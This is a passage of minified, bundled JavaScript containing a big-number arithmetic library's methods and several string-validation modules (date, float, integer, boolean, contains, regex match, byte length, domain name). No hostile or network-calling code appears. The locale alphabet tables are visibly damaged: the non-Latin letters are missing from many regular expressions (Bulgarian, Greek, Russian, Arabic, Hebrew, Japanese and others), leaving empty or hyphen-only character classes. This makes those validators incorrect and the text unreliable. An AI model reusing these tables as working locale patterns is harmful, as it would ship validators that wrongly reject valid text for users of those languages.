    i.dividedBy = i.div = function(C, W) {
        return e(this, new P(C,W), s, a)
    }
    ,
    i.dividedToIntegerBy = i.idiv = function(C, W) {
        return e(this, new P(C,W), 0, 1)
    }
    ,
    i.exponentiatedBy = i.pow = function(C, W) {
        var k, H, X, Y, V, R, _, $, z, K = this;
        if (C = new P(C),
        C.c && !C.isInteger())
            throw Error(_o + "Exponent not an integer: " + M(C));
        if (W != null && (W = new P(W)),
        R = C.e > 14,
        !K.c || !K.c[0] || K.c[0] == 1 && !K.e && K.c.length == 1 || !C.c || !C.c[0])
            return z = new P(Math.pow(+M(K), R ? C.s * (2 - yy(C)) : +M(C))),
            W ? z.mod(W) : z;
        if (_ = C.s < 0,
        W) {
            if (W.c ? !W.c[0] : !W.s)
                return new P(NaN);
            H = !_ && K.isInteger() && W.isInteger(),
            H && (K = K.mod(W))
        } else {
            if (C.e > 9 && (K.e > 0 || K.e < -1 || (K.e == 0 ? K.c[0] > 1 || R && K.c[1] >= 24e7 : K.c[0] < 8e13 || R && K.c[0] <= 9999975e7)))
                return Y = K.s < 0 && yy(C) ? -0 : 0,
                K.e > -1 && (Y = 1 / Y),
                new P(_ ? 1 / Y : Y);
            T && (Y = O2(T / Ft + 2))
        }
        for (R ? (k = new P(.5),
        _ && (C.s = 1),
        $ = yy(C)) : (X = Math.abs(+M(C)),
        $ = X % 2),
        z = new P(n); ; ) {
            if ($) {
                if (z = z.times(K),
                !z.c)
                    break;
                Y ? z.c.length > Y && (z.c.length = Y) : H && (z = z.mod(W))
            }
            if (X) {
                if (X = Si(X / 2),
                X === 0)
                    break;
                $ = X % 2
            } else if (C = C.times(k),
            I(C, C.e + 1, 1),
            C.e > 14)
                $ = yy(C);
            else {
                if (X = +M(C),
                X === 0)
                    break;
                $ = X % 2
            }
            K = K.times(K),
            Y ? K.c && K.c.length > Y && (K.c.length = Y) : H && (K = K.mod(W))
        }
        return H ? z : (_ && (z = n.div(z)),
        W ? z.mod(W) : Y ? I(z, T, a, V) : z)
    }
    ,
    i.integerValue = function(C) {
        var W = new P(this);
        return C == null ? C = a : Vr(C, 0, 8),
        I(W, W.e + 1, C)
    }
    ,
    i.isEqualTo = i.eq = function(C, W) {
        return Sl(this, new P(C,W)) === 0
    }
    ,
    i.isFinite = function() {
        return !!this.c
    }
    ,
    i.isGreaterThan = i.gt = function(C, W) {
        return Sl(this, new P(C,W)) > 0
    }
    ,
    i.isGreaterThanOrEqualTo = i.gte = function(C, W) {
        return (W = Sl(this, new P(C,W))) === 1 || W === 0
    }
    ,
    i.isInteger = function() {
        return !!this.c && Bi(this.e / Ft) > this.c.length - 2
    }
    ,
    i.isLessThan = i.lt = function(C, W) {
        return Sl(this, new P(C,W)) < 0
    }
    ,
    i.isLessThanOrEqualTo = i.lte = function(C, W) {
        return (W = Sl(this, new P(C,W))) === -1 || W === 0
    }
    ,
    i.isNaN = function() {
        return !this.s
    }
    ,
    i.isNegative = function() {
        return this.s < 0
    }
    ,
    i.isPositive = function() {
        return this.s > 0
    }
    ,
    i.isZero = function() {
        return !!this.c && this.c[0] == 0
    }
    ,
    i.minus = function(C, W) {
        var k, H, X, Y, V = this, R = V.s;
        if (C = new P(C,W),
        W = C.s,
        !R || !W)
            return new P(NaN);
        if (R != W)
            return C.s = -W,
            V.plus(C);
        var _ = V.e / Ft
          , $ = C.e / Ft
          , z = V.c
          , K = C.c;
        if (!_ || !$) {
            if (!z || !K)
                return z ? (C.s = -W,
                C) : new P(K ? V : NaN);
            if (!z[0] || !K[0])
                return K[0] ? (C.s = -W,
                C) : new P(z[0] ? V : a == 3 ? -0 : 0)
        }
        if (_ = Bi(_),
        $ = Bi($),
        z = z.slice(),
        R = _ - $) {
            for ((Y = R < 0) ? (R = -R,
            X = z) : ($ = _,
            X = K),
            X.reverse(),
            W = R; W--; X.push(0))
                ;
            X.reverse()
        } else
            for (H = (Y = (R = z.length) < (W = K.length)) ? R : W,
            R = W = 0; W < H; W++)
                if (z[W] != K[W]) {
                    Y = z[W] < K[W];
                    break
                }
        if (Y && (X = z,
        z = K,
        K = X,
        C.s = -C.s),
        W = (H = K.length) - (k = z.length),
        W > 0)
            for (; W--; z[k++] = 0)
                ;
        for (W = Xi - 1; H > R; ) {
            if (z[--H] < K[H]) {
                for (k = H; k && !z[--k]; z[k] = W)
                    ;
                --z[k],
                z[H] += Xi
            }
            z[H] -= K[H]
        }
        for (; z[0] == 0; z.splice(0, 1),
        --$)
            ;
        return z[0] ? D(C, z, $) : (C.s = a == 3 ? -1 : 1,
        C.c = [C.e = 0],
        C)
    }
    ,
    i.modulo = i.mod = function(C, W) {
        var k, H, X = this;
        return C = new P(C,W),
        !X.c || !C.s || C.c && !C.c[0] ? new P(NaN) : !C.c || X.c && !X.c[0] ? new P(X) : (v == 9 ? (H = C.s,
        C.s = 1,
        k = e(X, C, 0, 3),
        C.s = H,
        k.s *= H) : k = e(X, C, 0, v),
        C = X.minus(k.times(C)),
        !C.c[0] && v == 1 && (C.s = X.s),
        C)
    }
    ,
    i.multipliedBy = i.times = function(C, W) {
        var k, H, X, Y, V, R, _, $, z, K, j, ee, ie, ae, he, me = this, Pe = me.c, _e = (C = new P(C,W)).c;
        if (!Pe || !_e || !Pe[0] || !_e[0])
            return !me.s || !C.s || Pe && !Pe[0] && !_e || _e && !_e[0] && !Pe ? C.c = C.e = C.s = null : (C.s *= me.s,
            !Pe || !_e ? C.c = C.e = null : (C.c = [0],
            C.e = 0)),
            C;
        for (H = Bi(me.e / Ft) + Bi(C.e / Ft),
        C.s *= me.s,
        _ = Pe.length,
        K = _e.length,
        _ < K && (ie = Pe,
        Pe = _e,
        _e = ie,
        X = _,
        _ = K,
        K = X),
        X = _ + K,
        ie = []; X--; ie.push(0))
            ;
        for (ae = Xi,
        he = Tc,
        X = K; --X >= 0; ) {
            for (k = 0,
            j = _e[X] % he,
            ee = _e[X] / he | 0,
            V = _,
            Y = X + V; Y > X; )
                $ = Pe[--V] % he,
                z = Pe[V] / he | 0,
                R = ee * $ + z * j,
                $ = j * $ + R % he * he + ie[Y] + k,
                k = ($ / ae | 0) + (R / he | 0) + ee * z,
                ie[Y--] = $ % ae;
            ie[Y] = k
        }
        return k ? ++H : ie.splice(0, 1),
        D(C, ie, H)
    }
    ,
    i.negated = function() {
        var C = new P(this);
        return C.s = -C.s || null,
        C
    }
    ,
    i.plus = function(C, W) {
        var k, H = this, X = H.s;
        if (C = new P(C,W),
        W = C.s,
        !X || !W)
            return new P(NaN);
        if (X != W)
            return C.s = -W,
            H.minus(C);
        var Y = H.e / Ft
          , V = C.e / Ft
          , R = H.c
          , _ = C.c;
        if (!Y || !V) {
            if (!R || !_)
                return new P(X / 0);
            if (!R[0] || !_[0])
                return _[0] ? C : new P(R[0] ? H : X * 0)
        }
        if (Y = Bi(Y),
        V = Bi(V),
        R = R.slice(),
        X = Y - V) {
            for (X > 0 ? (V = Y,
            k = _) : (X = -X,
            k = R),
            k.reverse(); X--; k.push(0))
                ;
            k.reverse()
        }
        for (X = R.length,
        W = _.length,
        X - W < 0 && (k = _,
        _ = R,
        R = k,
        W = X),
        X = 0; W; )
            X = (R[--W] = R[W] + _[W] + X) / Xi | 0,
            R[W] = Xi === R[W] ? 0 : R[W] % Xi;
        return X && (R = [X].concat(R),
        ++V),
        D(C, R, V)
    }
    ,
    i.precision = i.sd = function(C, W) {
        var k, H, X, Y = this;
        if (C != null && C !== !!C)
            return Vr(C, 1, Qo),
            W == null ? W = a : Vr(W, 0, 8),
            I(new P(Y), C, W);
        if (!(k = Y.c))
            return null;
        if (X = k.length - 1,
        H = X * Ft + 1,
        X = k[X]) {
            for (; X % 10 == 0; X /= 10,
            H--)
                ;
            for (X = k[0]; X >= 10; X /= 10,
            H++)
                ;
        }
        return C && Y.e + 1 > H && (H = Y.e + 1),
        H
    }
    ,
    i.shiftedBy = function(C) {
        return Vr(C, -9007199254740991, eI),
        this.times("1e" + C)
    }
    ,
    i.squareRoot = i.sqrt = function() {
        var C, W, k, H, X, Y = this, V = Y.c, R = Y.s, _ = Y.e, $ = s + 4, z = new P("0.5");
        if (R !== 1 || !V || !V[0])
            return new P(!R || R < 0 && (!V || V[0]) ? NaN : V ? Y : 1 / 0);
        if (R = Math.sqrt(+M(Y)),
        R == 0 || R == 1 / 0 ? (W = Ti(V),
        (W.length + _) % 2 == 0 && (W += "0"),
        R = Math.sqrt(+W),
        _ = Bi((_ + 1) / 2) - (_ < 0 || _ % 2),
        R == 1 / 0 ? W = "5e" + _ : (W = R.toExponential(),
        W = W.slice(0, W.indexOf("e") + 1) + _),
        k = new P(W)) : k = new P(R + ""),
        k.c[0]) {
            for (_ = k.e,
            R = _ + $,
            R < 3 && (R = 0); ; )
                if (X = k,
                k = z.times(X.plus(e(Y, X, $, 1))),
                Ti(X.c).slice(0, R) === (W = Ti(k.c)).slice(0, R))
                    if (k.e < _ && --R,
                    W = W.slice(R - 3, R + 1),
                    W == "9999" || !H && W == "4999") {
                        if (!H && (I(X, X.e + s + 2, 0),
                        X.times(X).eq(Y))) {
                            k = X;
                            break
                        }
                        $ += 4,
                        R += 4,
                        H = 1
                    } else {
                        (!+W || !+W.slice(1) && W.charAt(0) == "5") && (I(k, k.e + s + 2, 1),
                        C = !k.times(k).eq(Y));
                        break
                    }
        }
        return I(k, k.e + s + 1, a, C)
    }
    ,
    i.toExponential = function(C, W) {
        return C != null && (Vr(C, 0, Qo),
        C++),
        O(this, C, W, 1)
    }
    ,
    i.toFixed = function(C, W) {
        return C != null && (Vr(C, 0, Qo),
        C = C + this.e + 1),
        O(this, C, W)
    }
    ,
    i.toFormat = function(C, W, k) {
        var H, X = this;
        if (k == null)
            C != null && W && typeof W == "object" ? (k = W,
            W = null) : C && typeof C == "object" ? (k = C,
            C = W = null) : k = x;
        else if (typeof k != "object")
            throw Error(_o + "Argument not an object: " + k);
        if (H = X.toFixed(C, W),
        X.c) {
            var Y, V = H.split("."), R = +k.groupSize, _ = +k.secondaryGroupSize, $ = k.groupSeparator || "", z = V[0], K = V[1], j = X.s < 0, ee = j ? z.slice(1) : z, ie = ee.length;
            if (_ && (Y = R,
            R = _,
            _ = Y,
            ie -= Y),
            R > 0 && ie > 0) {
                for (Y = ie % R || R,
                z = ee.substr(0, Y); Y < ie; Y += R)
                    z += $ + ee.substr(Y, R);
                _ > 0 && (z += $ + ee.slice(Y)),
                j && (z = "-" + z)
            }
            H = K ? z + (k.decimalSeparator || "") + ((_ = +k.fractionGroupSize) ? K.replace(new RegExp("\\d{" + _ + "}\\B","g"), "$&" + (k.fractionGroupSeparator || "")) : K) : z
        }
        return (k.prefix || "") + H + (k.suffix || "")
    }
    ,
    i.toFraction = function(C) {
        var W, k, H, X, Y, V, R, _, $, z, K, j, ee = this, ie = ee.c;
        if (C != null && (R = new P(C),
        !R.isInteger() && (R.c || R.s !== 1) || R.lt(n)))
            throw Error(_o + "Argument " + (R.isInteger() ? "out of range: " : "not an integer: ") + M(R));
        if (!ie)
            return new P(ee);
        for (W = new P(n),
        $ = k = new P(n),
        H = _ = new P(n),
        j = Ti(ie),
        Y = W.e = j.length - ee.e - 1,
        W.c[0] = R2[(V = Y % Ft) < 0 ? Ft + V : V],
        C = !C || R.comparedTo(W) > 0 ? Y > 0 ? W : $ : R,
        V = p,
        p = 1 / 0,
        R = new P(j),
        _.c[0] = 0; z = e(R, W, 0, 1),
        X = k.plus(z.times(H)),
        X.comparedTo(C) != 1; )
            k = H,
            H = X,
            $ = _.plus(z.times(X = $)),
            _ = X,
            W = R.minus(z.times(X = W)),
            R = X;
        return X = e(C.minus(k), H, 0, 1),
        _ = _.plus(X.times($)),
        k = k.plus(X.times(H)),
        _.s = $.s = ee.s,
        Y = Y * 2,
        K = e($, H, Y, a).minus(ee).abs().comparedTo(e(_, k, Y, a).minus(ee).abs()) < 1 ? [$, H] : [_, k],
        p = V,
        K
    }
    ,
    i.toNumber = function() {
        return +M(this)
    }
    ,
    i.toPrecision = function(C, W) {
        return C != null && Vr(C, 1, Qo),
        O(this, C, W, 2)
    }
    ,
    i.toString = function(C) {
        var W, k = this, H = k.s, X = k.e;
        return X === null ? H ? (W = "Infinity",
        H < 0 && (W = "-" + W)) : W = "NaN" : (C == null ? W = X <= l || X >= f ? by(Ti(k.c), X) : Ta(Ti(k.c), X, "0") : C === 10 && B ? (k = I(new P(k), s + X + 1, a),
        W = Ta(Ti(k.c), k.e, "0")) : (Vr(C, 2, E.length, "Base"),
        W = t(Ta(Ti(k.c), X, "0"), 10, C, H, !0)),
        H < 0 && k.c[0] && (W = "-" + W)),
        W
    }
    ,
    i.valueOf = i.toJSON = function() {
        return M(this)
    }
    ,
    i._isBigNumber = !0,
    i[Symbol.toStringTag] = "BigNumber",
    i[Symbol.for("nodejs.util.inspect.custom")] = i.valueOf,
    r != null && P.set(r),
    P
}
function Bi(r) {
    var e = r | 0;
    return r > 0 || r === e ? e : e - 1
}
function Ti(r) {
    for (var e, t, o = 1, i = r.length, n = r[0] + ""; o < i; ) {
        for (e = r[o++] + "",
        t = Ft - e.length; t--; e = "0" + e)
            ;
        n += e
    }
    for (i = n.length; n.charCodeAt(--i) === 48; )
        ;
    return n.slice(0, i + 1 || 1)
}
function Sl(r, e) {
    var t, o, i = r.c, n = e.c, s = r.s, a = e.s, l = r.e, f = e.e;
    if (!s || !a)
        return null;
    if (t = i && !i[0],
    o = n && !n[0],
    t || o)
        return t ? o ? 0 : -a : s;
    if (s != a)
        return s;
    if (t = s < 0,
    o = l == f,
    !i || !n)
        return o ? 0 : !i ^ t ? 1 : -1;
    if (!o)
        return l > f ^ t ? 1 : -1;
    for (a = (l = i.length) < (f = n.length) ? l : f,
    s = 0; s < a; s++)
        if (i[s] != n[s])
            return i[s] > n[s] ^ t ? 1 : -1;
    return l == f ? 0 : l > f ^ t ? 1 : -1
}
function Vr(r, e, t, o) {
    if (r < e || r > t || r !== Si(r))
        throw Error(_o + (o || "Argument") + (typeof r == "number" ? r < e || r > t ? " out of range: " : " not an integer: " : " not a primitive number: ") + String(r))
}
function yy(r) {
    var e = r.c.length - 1;
    return Bi(r.e / Ft) == e && r.c[e] % 2 != 0
}
function by(r, e) {
    return (r.length > 1 ? r.charAt(0) + "." + r.slice(1) : r) + (e < 0 ? "e" : "e+") + e
}
function Ta(r, e, t) {
    var o, i;
    if (e < 0) {
        for (i = t + "."; ++e; i += t)
            ;
        r = i + r
    } else if (o = r.length,
    ++e > o) {
        for (i = t,
        e -= o; --e; i += t)
            ;
        r += i
    } else
        e < o && (r = r.slice(0, e) + "." + r.slice(e));
    return r
}
var Cm = _D(), my = {
    exports: {}
}, xy = {
    exports: {}
}, wy = {
    exports: {}
}, tI;
function Ve() {
    return tI || (tI = 1,
    function(r, e) {
        Object.defineProperty(e, "__esModule", {
            value: !0
        }),
        e.default = o;
        function t(i) {
            "@babel/helpers - typeof";
            return t = typeof Symbol == "function" && typeof Symbol.iterator == "symbol" ? function(n) {
                return typeof n
            }
            : function(n) {
                return n && typeof Symbol == "function" && n.constructor === Symbol && n !== Symbol.prototype ? "symbol" : typeof n
            }
            ,
            t(i)
        }
        function o(i) {
            var n = typeof i == "string" || i instanceof String;
            if (!n) {
                var s = t(i);
                throw i === null ? s = "null" : s === "object" && (s = i.constructor.name),
                new TypeError("Expected a string but received a ".concat(s))
            }
        }
        r.exports = e.default,
        r.exports.default = e.default
    }(wy, wy.exports)),
    wy.exports
}
var rI;
function q3() {
    return rI || (rI = 1,
    function(r, e) {
        Object.defineProperty(e, "__esModule", {
            value: !0
        }),
        e.default = i;
        var t = o(Ve());
        function o(n) {
            return n && n.__esModule ? n : {
                default: n
            }
        }
        function i(n) {
            return (0,
            t.default)(n),
            n = Date.parse(n),
            isNaN(n) ? null : new Date(n)
        }
        r.exports = e.default,
        r.exports.default = e.default
    }(xy, xy.exports)),
    xy.exports
}
var vy = {
    exports: {}
}, Tf = {}, Xr = {}, nI;
function S0() {
    if (nI)
        return Xr;
    nI = 1,
    Object.defineProperty(Xr, "__esModule", {
        value: !0
    }),
    Xr.farsiLocales = Xr.englishLocales = Xr.dotDecimal = Xr.decimal = Xr.commaDecimal = Xr.bengaliLocales = Xr.arabicLocales = Xr.alphanumeric = Xr.alpha = void 0;
    for (var r = Xr.alpha = {
        "en-US": /^[A-Z]+$/i,
        "az-AZ": /^[A-VXYZ]+$/i,
        "bg-BG": /^[-]+$/i,
        "cs-CZ": /^[A-Z]+$/i,
        "da-DK": /^[A-Z]+$/i,
        "de-DE": /^[A-Z]+$/i,
        "el-GR": /^[-]+$/i,
        "es-ES": /^[A-Z]+$/i,
        "fa-IR": /^[]+$/i,
        "fi-FI": /^[A-Z]+$/i,
        "fr-FR": /^[A-Z]+$/i,
        "it-IT": /^[A-Z]+$/i,
        "ja-JP": /^[----]+$/i,
        "nb-NO": /^[A-Z]+$/i,
        "nl-NL": /^[A-Z]+$/i,
        "nn-NO": /^[A-Z]+$/i,
        "hu-HU": /^[A-Z]+$/i,
        "pl-PL": /^[A-Z]+$/i,
        "pt-PT": /^[A-Z]+$/i,
        "ru-RU": /^[-]+$/i,
        "kk-KZ": /^[-\u04D8\u04B0\u0406\u04A2\u0492\u04AE\u049A\u04E8\u04BA]+$/i,
        "sl-SI": /^[A-Z]+$/i,
        "sk-SK": /^[A-Z]+$/i,
        "sr-RS@latin": /^[A-Z]+$/i,
        "sr-RS": /^[-]+$/i,
        "sv-SE": /^[A-Z]+$/i,
        "th-TH": /^[-\s]+$/i,
        "tr-TR": /^[A-Z]+$/i,
        "uk-UA": /^[-I]+$/i,
        "vi-VN": /^[A-Z]+$/i,
        "ko-KR": /^[---]*$/,
        "ku-IQ": /^[]+$/i,
        ar: /^[]+$/,
        he: /^[-]+$/,
        fa: /^['']+$/i,
        bn: /^['']+$/,
        eo: /^[ABCD-GHIJK-PRSTUVZ]+$/i,
        "hi-IN": /^[\u0900-\u0961]+[\u0972-\u097F]*$/i,
        "si-LK": /^[\u0D80-\u0DFF]+$/
    }, e = Xr.alphanumeric = {
        "en-US": /^[0-9A-Z]+$/i,
        "az-AZ": /^[0-9A-VXYZ]+$/i,
        "bg-BG": /^[0-9-]+$/i,
        "cs-CZ": /^[0-9A-Z]+$/i,
        "da-DK": /^[0-9A-Z]+$/i,
        "de-DE": /^[0-9A-Z]+$/i,
        "el-GR": /^[0-9-]+$/i,
        "es-ES": /^[0-9A-Z]+$/i,
        "fi-FI": /^[0-9A-Z]+$/i,
        "fr-FR": /^[0-9A-Z]+$/i,
        "it-IT": /^[0-9A-Z]+$/i,
        "ja-JP": /^[0-9-----]+$/i,
        "hu-HU": /^[0-9A-Z]+$/i,
        "nb-NO": /^[0-9A-Z]+$/i,
        "nl-NL": /^[0-9A-Z]+$/i,
        "nn-NO": /^[0-9A-Z]+$/i,
        "pl-PL": /^[0-9A-Z]+$/i,
        "pt-PT": /^[0-9A-Z]+$/i,
        "ru-RU": /^[0-9-]+$/i,
        "kk-KZ": /^[0-9-\u04D8\u04B0\u0406\u04A2\u0492\u04AE\u049A\u04E8\u04BA]+$/i,
        "sl-SI": /^[0-9A-Z]+$/i,
        "sk-SK": /^[0-9A-Z]+$/i,
        "sr-RS@latin": /^[0-9A-Z]+$/i,
        "sr-RS": /^[0-9-]+$/i,
        "sv-SE": /^[0-9A-Z]+$/i,
        "th-TH": /^[-\s]+$/i,
        "tr-TR": /^[0-9A-Z]+$/i,
        "uk-UA": /^[0-9-I]+$/i,
        "ko-KR": /^[0-9---]*$/,
        "ku-IQ": /^[0-9]+$/i,
        "vi-VN": /^[0-9A-Z]+$/i,
        ar: /^[0-9]+$/,
        he: /^[0-9-]+$/,
        fa: /^['0-9']+$/i,
        bn: /^['']+$/,
        eo: /^[0-9ABCD-GHIJK-PRSTUVZ]+$/i,
        "hi-IN": /^[\u0900-\u0963]+[\u0966-\u097F]*$/i,
        "si-LK": /^[0-9\u0D80-\u0DFF]+$/
    }, t = Xr.decimal = {
        "en-US": ".",
        ar: ""
    }, o = Xr.englishLocales = ["AU", "GB", "HK", "IN", "NZ", "ZA", "ZM"], i, n = 0; n < o.length; n++)
        i = "en-".concat(o[n]),
        r[i] = r["en-US"],
        e[i] = e["en-US"],
        t[i] = t["en-US"];
    for (var s = Xr.arabicLocales = ["AE", "BH", "DZ", "EG", "IQ", "JO", "KW", "LB", "LY", "MA", "QM", "QA", "SA", "SD", "SY", "TN", "YE"], a, l = 0; l < s.length; l++)
        a = "ar-".concat(s[l]),
        r[a] = r.ar,
        e[a] = e.ar,
        t[a] = t.ar;
    for (var f = Xr.farsiLocales = ["IR", "AF"], h, p = 0; p < f.length; p++)
        h = "fa-".concat(f[p]),
        e[h] = e.fa,
        t[h] = t.ar;
    for (var b = Xr.bengaliLocales = ["BD", "IN"], v, T = 0; T < b.length; T++)
        v = "bn-".concat(b[T]),
        r[v] = r.bn,
        e[v] = e.bn,
        t[v] = t["en-US"];
    for (var x = Xr.dotDecimal = ["ar-EG", "ar-LB", "ar-LY"], E = Xr.commaDecimal = ["bg-BG", "cs-CZ", "da-DK", "de-DE", "el-GR", "en-ZM", "eo", "es-ES", "fr-CA", "fr-FR", "id-ID", "it-IT", "ku-IQ", "hi-IN", "hu-HU", "nb-NO", "nn-NO", "nl-NL", "pl-PL", "pt-PT", "ru-RU", "kk-KZ", "si-LK", "sl-SI", "sr-RS@latin", "sr-RS", "sv-SE", "tr-TR", "uk-UA", "vi-VN"], B = 0; B < x.length; B++)
        t[x[B]] = t["en-US"];
    for (var P = 0; P < E.length; P++)
        t[E[P]] = ",";
    return r["fr-CA"] = r["fr-FR"],
    e["fr-CA"] = e["fr-FR"],
    r["pt-BR"] = r["pt-PT"],
    e["pt-BR"] = e["pt-PT"],
    t["pt-BR"] = t["pt-PT"],
    r["pl-Pl"] = r["pl-PL"],
    e["pl-Pl"] = e["pl-PL"],
    t["pl-Pl"] = t["pl-PL"],
    r["fa-AF"] = r.fa,
    Xr
}
var oI;
function ID() {
    if (oI)
        return Tf;
    oI = 1,
    Object.defineProperty(Tf, "__esModule", {
        value: !0
    }),
    Tf.default = o,
    Tf.locales = void 0;
    var r = t(Ve())
      , e = S0();
    function t(i) {
        return i && i.__esModule ? i : {
            default: i
        }
    }
    function o(i, n) {
        (0,
        r.default)(i),
        n = n || {};
        var s = new RegExp("^(?:[-+])?(?:[0-9]+)?(?:\\".concat(n.locale ? e.decimal[n.locale] : ".", "[0-9]*)?(?:[eE][\\+\\-]?(?:[0-9]+))?$"));
        if (i === "" || i === "." || i === "," || i === "-" || i === "+")
            return !1;
        var a = parseFloat(i.replace(",", "."));
        return s.test(i) && (!n.hasOwnProperty("min") || a >= n.min) && (!n.hasOwnProperty("max") || a <= n.max) && (!n.hasOwnProperty("lt") || a < n.lt) && (!n.hasOwnProperty("gt") || a > n.gt)
    }
    return Tf.locales = Object.keys(e.decimal),
    Tf
}
var iI;
function OD() {
    return iI || (iI = 1,
    function(r, e) {
        Object.defineProperty(e, "__esModule", {
            value: !0
        }),
        e.default = i;
        var t = o(ID());
        function o(n) {
            return n && n.__esModule ? n : {
                default: n
            }
        }
        function i(n) {
            return (0,
            t.default)(n) ? parseFloat(n) : NaN
        }
        r.exports = e.default,
        r.exports.default = e.default
    }(vy, vy.exports)),
    vy.exports
}
var Ty = {
    exports: {}
}, sI;
function Fce() {
    return sI || (sI = 1,
    function(r, e) {
        Object.defineProperty(e, "__esModule", {
            value: !0
        }),
        e.default = i;
        var t = o(Ve());
        function o(n) {
            return n && n.__esModule ? n : {
                default: n
            }
        }
        function i(n, s) {
            return (0,
            t.default)(n),
            parseInt(n, s || 10)
        }
        r.exports = e.default,
        r.exports.default = e.default
    }(Ty, Ty.exports)),
    Ty.exports
}
var Ey = {
    exports: {}
}, aI;
function Uce() {
    return aI || (aI = 1,
    function(r, e) {
        Object.defineProperty(e, "__esModule", {
            value: !0
        }),
        e.default = i;
        var t = o(Ve());
        function o(n) {
            return n && n.__esModule ? n : {
                default: n
            }
        }
        function i(n, s) {
            return (0,
            t.default)(n),
            s ? n === "1" || /^true$/i.test(n) : n !== "0" && !/^false$/i.test(n) && n !== ""
        }
        r.exports = e.default,
        r.exports.default = e.default
    }(Ey, Ey.exports)),
    Ey.exports
}
var Ay = {
    exports: {}
}, cI;
function kce() {
    return cI || (cI = 1,
    function(r, e) {
        Object.defineProperty(e, "__esModule", {
            value: !0
        }),
        e.default = i;
        var t = o(Ve());
        function o(n) {
            return n && n.__esModule ? n : {
                default: n
            }
        }
        function i(n, s) {
            return (0,
            t.default)(n),
            n === s
        }
        r.exports = e.default,
        r.exports.default = e.default
    }(Ay, Ay.exports)),
    Ay.exports
}
var Py = {
    exports: {}
}, Cy = {
    exports: {}
}, lI;
function RD() {
    return lI || (lI = 1,
    function(r, e) {
        Object.defineProperty(e, "__esModule", {
            value: !0
        }),
        e.default = o;
        function t(i) {
            "@babel/helpers - typeof";
            return t = typeof Symbol == "function" && typeof Symbol.iterator == "symbol" ? function(n) {
                return typeof n
            }
            : function(n) {
                return n && typeof Symbol == "function" && n.constructor === Symbol && n !== Symbol.prototype ? "symbol" : typeof n
            }
            ,
            t(i)
        }
        function o(i) {
            return t(i) === "object" && i !== null ? typeof i.toString == "function" ? i = i.toString() : i = "[object Object]" : (i === null || typeof i > "u" || isNaN(i) && !i.length) && (i = ""),
            String(i)
        }
        r.exports = e.default,
        r.exports.default = e.default
    }(Cy, Cy.exports)),
    Cy.exports
}
var Sy = {
    exports: {}
}, uI;
function wo() {
    return uI || (uI = 1,
    function(r, e) {
        Object.defineProperty(e, "__esModule", {
            value: !0
        }),
        e.default = t;
        function t() {
            var o = arguments.length > 0 && arguments[0] !== void 0 ? arguments[0] : {}
              , i = arguments.length > 1 ? arguments[1] : void 0;
            for (var n in i)
                typeof o[n] > "u" && (o[n] = i[n]);
            return o
        }
        r.exports = e.default,
        r.exports.default = e.default
    }(Sy, Sy.exports)),
    Sy.exports
}
var fI;
function Lce() {
    return fI || (fI = 1,
    function(r, e) {
        Object.defineProperty(e, "__esModule", {
            value: !0
        }),
        e.default = a;
        var t = n(Ve())
          , o = n(RD())
          , i = n(wo());
        function n(l) {
            return l && l.__esModule ? l : {
                default: l
            }
        }
        var s = {
            ignoreCase: !1,
            minOccurrences: 1
        };
        function a(l, f, h) {
            return (0,
            t.default)(l),
            h = (0,
            i.default)(h, s),
            h.ignoreCase ? l.toLowerCase().split((0,
            o.default)(f).toLowerCase()).length > h.minOccurrences : l.split((0,
            o.default)(f)).length > h.minOccurrences
        }
        r.exports = e.default,
        r.exports.default = e.default
    }(Py, Py.exports)),
    Py.exports
}
var By = {
    exports: {}
}, dI;
function $ce() {
    return dI || (dI = 1,
    function(r, e) {
        Object.defineProperty(e, "__esModule", {
            value: !0
        }),
        e.default = i;
        var t = o(Ve());
        function o(n) {
            return n && n.__esModule ? n : {
                default: n
            }
        }
        function i(n, s, a) {
            return (0,
            t.default)(n),
            Object.prototype.toString.call(s) !== "[object RegExp]" && (s = new RegExp(s,a)),
            !!n.match(s)
        }
        r.exports = e.default,
        r.exports.default = e.default
    }(By, By.exports)),
    By.exports
}
var _y = {
    exports: {}
}, Iy = {
    exports: {}
}, hI;
function WD() {
    return hI || (hI = 1,
    function(r, e) {
        Object.defineProperty(e, "__esModule", {
            value: !0
        }),
        e.default = n;
        var t = o(Ve());
        function o(s) {
            return s && s.__esModule ? s : {
                default: s
            }
        }
        function i(s) {
            "@babel/helpers - typeof";
            return i = typeof Symbol == "function" && typeof Symbol.iterator == "symbol" ? function(a) {
                return typeof a
            }
            : function(a) {
                return a && typeof Symbol == "function" && a.constructor === Symbol && a !== Symbol.prototype ? "symbol" : typeof a
            }
            ,
            i(s)
        }
        function n(s, a) {
            (0,
            t.default)(s);
            var l, f;
            i(a) === "object" ? (l = a.min || 0,
            f = a.max) : (l = arguments[1],
            f = arguments[2]);
            var h = encodeURI(s).split(/%..|./).length - 1;
            return h >= l && (typeof f > "u" || h <= f)
        }
        r.exports = e.default,
        r.exports.default = e.default
    }(Iy, Iy.exports)),
    Iy.exports
}
var Oy = {
    exports: {}
}, pI;
function V3() {
    return pI || (pI = 1,
    function(r, e) {
        Object.defineProperty(e, "__esModule", {
            value: !0
        }),
        e.default = s;
        var t = i(Ve())
          , o = i(wo());
        function i(a) {
            return a && a.__esModule ? a : {
                default: a
            }
        }
        var n = {
            require_tld: !0,
            allow_underscores: !1,
            allow_trailing_dot: !1,
            allow_numeric_tld: !1,
            allow_wildcard: !1,
            ignore_max_length: !1
        };
        function s(a, l) {
            (0,
            t.default)(a),
            l = (0,
            o.default)(l, n),
            l.allow_trailing_dot && a[a.length - 1] === "." && (a = a.substring(0, a.length - 1)),
            l.allow_wildcard === !0 && a.indexOf("*.") === 0 && (a = a.substring(2));
            var f = a.split(".")
              , h = f[f.length - 1];
            return l.require_tld && (f.length < 2 || !l.allow_numeric_tld && !/^([a-z\u00A1-\u00A8\u00AA-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF]{2,}|xn[a-z0-9-]{2,})$/i.test(h) || /\s/.test(h)) || !l.allow_numeric_tld && /^\d+$/.test(h) ? !1 : f.every(function(p) {
                return !(p.length > 63 && !l.ignore_max_length || !/^[a-z_\u00a1-\uffff0-9-]+$/i.test(p) || /[\uff01-\uff5e]/.test(p) || /^-|-$/.test(p) || !l.allow_underscores && /_/.test(p))
            })
        }
        r.exports = e.default,
        r.exports.default = e.default
    }(Oy, Oy.exports)),
    Oy.exports
}
var Ry = {
    exports: {}
}, gI;
function z1() {
    return gI || (gI = 1,
    function(r, e) {
        Object.defineProperty(e, "__esModule", {
            value: !0
        }),
        e.default = f;
        var t = o(Ve());
        function o(h) {
            return h && h.__esModule ? h : {
                default: h
            }
